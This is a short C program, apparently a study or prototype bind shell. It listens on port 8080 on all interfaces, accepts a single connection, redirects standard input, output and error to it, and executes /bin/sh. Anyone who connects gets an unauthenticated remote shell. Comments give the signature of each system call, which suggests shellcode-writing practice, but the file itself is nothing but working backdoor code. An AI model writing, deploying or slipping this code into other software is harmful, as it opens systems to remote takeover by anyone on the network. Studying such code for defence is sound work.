#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define PORT 8080

int hostfd, clientfd;
struct sockaddr_in server_addr;

int main()
{

	// create socket
	// int socket(int domain, int type, int protocol);
	hostfd = socket(AF_INET, SOCK_STREAM, 0);	

	// set server info
	server_addr.sin_family = AF_INET;		// IPv4
	server_addr.sin_addr.s_addr = INADDR_ANY;	// 0.0.0.0
	server_addr.sin_port = htons(PORT);		// Port number (8080)

	// bind socket
	// bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	bind(hostfd, (struct sockaddr*) &server_addr, sizeof(server_addr));
	
	// listen for incoming connections
	// int listen(int sockfd, int backlog);
	listen(hostfd, 0);

	// accept connections
	// int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	clientfd = accept(hostfd, NULL, NULL);

	// input, output, and error redirection
	// int dup2(int oldfd, int newfd);
	dup2(clientfd, 0);
	dup2(clientfd, 1);
	dup2(clientfd, 2);

	// execute shell - /bin/sh
	// int execve(const char *filename, char *const argv[], char *const envp[]);
	execve("/bin/sh", NULL, NULL);

}
